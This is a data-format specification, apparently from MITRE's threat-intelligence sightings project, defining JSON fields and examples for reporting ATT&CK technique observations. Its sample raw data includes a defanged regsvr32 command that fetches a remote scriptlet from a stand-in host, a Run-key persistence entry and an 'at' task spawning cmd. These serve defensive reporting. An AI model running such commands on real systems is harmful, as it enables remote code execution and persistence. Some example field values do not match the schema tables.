
## Data Model Format Definitions

All formats are JSON and consist of either a list of entries or a single entry. Please e-mail <ctid@mitre-engenuity.org> with any questions or suggestions.

Fields in **bold** are required, all other fields are optional. For the "Timestamp" datatype, please use RFC 3339 timestamps in UTC time. Most importantly, please do not include any information beyond that specified in the format below. In particular, we do not want to collect sensitive victim information or other PII.
<br></br>
## <a class="anchor" name="direct-technique-sighting"></a>Sighting

|Field                                             |Datatype                                        |Description
|--------------------------------------------------|------------------------------------------------|----------|
|**version**                                           |String                                          |A required version string for this model. This must be set to **`1.0`**.
|**id**                                           |String                                          |A required ID for this event. Can be any format, but if you don\'t have a preference UUIDv4 is preferred to ensure uniqueness.
|**sightingType**                                 |String                                          |Either "direct-technique", "direct-software", or "indirect-software".
|**startTime**                                    |Timestamp                                       |The time the activity started.
|endTime                                           |Timestamp                                       |The time the activity ended.
|**detectionType**                                |String                                          |Either "human-validated", "machine-validated", or "raw". Use human-validated when a human analyst has reviewed the detection and determined it to not be a false positive. Use machine-validated when a machine has performed an analysis on it, e.g. a sandbox. Use raw when no validation has occured. 
|**techniques**                                   |List   |The list of techniques that were observed. The technique field has its own schema, so please use the [table](#technique) below for formatting.
|sectors                                           |List\[String\]                                  |A list of sectors that the victim belongs to.
|country                                           |String                                          |The ISO country code of the victim.
|size                                              |String                                          |The approximate size (in number of employees) of the victim.
|attributionType                                   |String                                          |Either "group", "incident", \"software\".
|attribution                                       |String                                          |The name of the threat group, incident/campaign, or malicious software associated to this activity. This should ideally be an exact name from the list of [Group Names or Associated Groups](https://attack.mitre.org/groups/) already in ATT&CK for threat groups, and of [Software Names or Associated Software](https://attack.mitre.org/software/) already in ATT&CK for malicious software.
|detection_source                                  |String                                          |Either "host-based", "network-based".
|privilege_level                                   |String                                          |Either "system", "admin", "user", "none".
<br></br>


## <a class="anchor" name="technique"></a>Technique

| Field                 | Datatype              | Description           |
|-----------------------|-----------------------|-----------------------|
|**version**                                           |String                                          |A required version string for this model. This must be set to **`1.0`**.
|**techniqueID**       | String                | The ATT&CK ID (e.g., "T1086") that was observed.
| platform              | String                | The platform this technique was observed on. Please include the full name, edition, and version. E.g., "Windows 10 Enterprise", "Windows Server 2012 Standard", "MacOS 10.13.5", "Ubuntu 14.04".
| **startTime**             | Timestamp             | The time that this specific technique was observed.
| endTime               | Timestamp             | The time that this specific technique sighting ended.
| tactic                | String                | The name of the tactic that this technique was used to enable. For example, a sighting of Scheduled Task could indicate whether it was used for privilege escalation or for persistence. Format should be the tactic name as referenced in ATT&CK navigator layer file format (lowercase dashed, credential-access).
| rawData               | List\[data\]          | The list of raw data, if sharable, to support this observation. Could be command lines, event records, etc. Format this as described below.|

<br></br>

## Formatting raw data

Each object in the list of raw data should consist of an object from the [CAR data model](https://car.mitre.org/data_model/) in the form of "object.action": {"field": "value"}.

For example:

**Command Line**:
```
"process.create": {"command_line": "regsvr32.exe /i:hxxp://lolbad.com scrobj.dll"}
```

**Registry Key**:
```
"registry.add": {
    "hive": "HKEY_CURRENT_USER",
    "key": "\Software\Microsoft\Windows\CurrentVersion\Run",
    "value": "bad.exe"
}
```

More complete examples are also below. If something isn't expressible in the CAR data model as-is, just make up an object and action that makes sense to you and we'll figure it out.
<br><br>
## Examples

#### Simple Technique Sighting
A managed service provider monitors sensor data across its customer base. During that monitoring, an analytic flags a Sysmon process event that indicates a scheduled task is being created using "at".

```
{
  "version": "1.0",
  "id": "DT-1234",
  "sightingType": "direct-technique-sighting",
  "startTime": "2019-01-01T08:12:00Z",
  "endTime": "2019-01-01T08:12:00Z",
  "detectionType": "human-validated",
  "techniques": [
    {
      "techniqueID": "T1088",
      "startTime": "2019-01-01T08:12:00Z",
      "endTime": "2019-01-01T08:12:00Z",
      "platform": "Windows 10",
      "rawData": [
        { "process.create": {"command_line": "at 13:30 /interactive cmd"} }
      ]
    }
  ]
}
```

#### Technique Sighting with Attribution
An ISAC collects, anonymizes, and redistributes sightings from its members. While it doesn’t receive the raw data, it does have demographic and (sometimes) attribution information.

```
{
  "version": "1.0",
  "id": "1000",
  "sightingType": "direct-technique-sighting",
  "startTime": "2019-01-01T08:12:00Z",
  "endTime": "2019-01-01T08:12:00Z",
  "detectionType": "human-validated",
  "sectors": ["finance"],
  "attributionType": "group",
  "attribution": "FIN7",
  "techniques": [
    {
      "techniqueID": "T1003",
      "startTime": "2019-01-01T08:12:00Z",
      "endTime": "2019-01-01T08:12:00Z",
      "platform": "Windows 10 Enterprise"
    }
  ]
}
```

#### Malware Blocked by Security Tool
A large end-user organization is running an anti-malware service that blocks execution of a Mac malware already in ATT&CK.

```
{
  "version": "1.0",
  "id": "32",
  "sightingType": "direct-malware-sighting",
  "startTime": "2019-01-01T08:12:00Z",
  "endTime": "2019-01-01T08:12:00Z",
  "detectionType": "raw",
  "sectors": ["healthcare"],
  "software": "MacSpy"
}
```

#### IOC Submission
A TIP vendor submits a set of IOCs that have been identified with ATT&CK techniques.

```
{
  "version": "1.0",
  "id": "32",
  "sightingType": "indirect-malware-sighting",
  "startTime": "2019-01-01T08:12:00Z",
  "endTime": "2019-01-01T08:12:00Z",
  "sectors": ["healthcare"],
  "software": "RemCom",
  "ioc": "<some hash>"
} 
```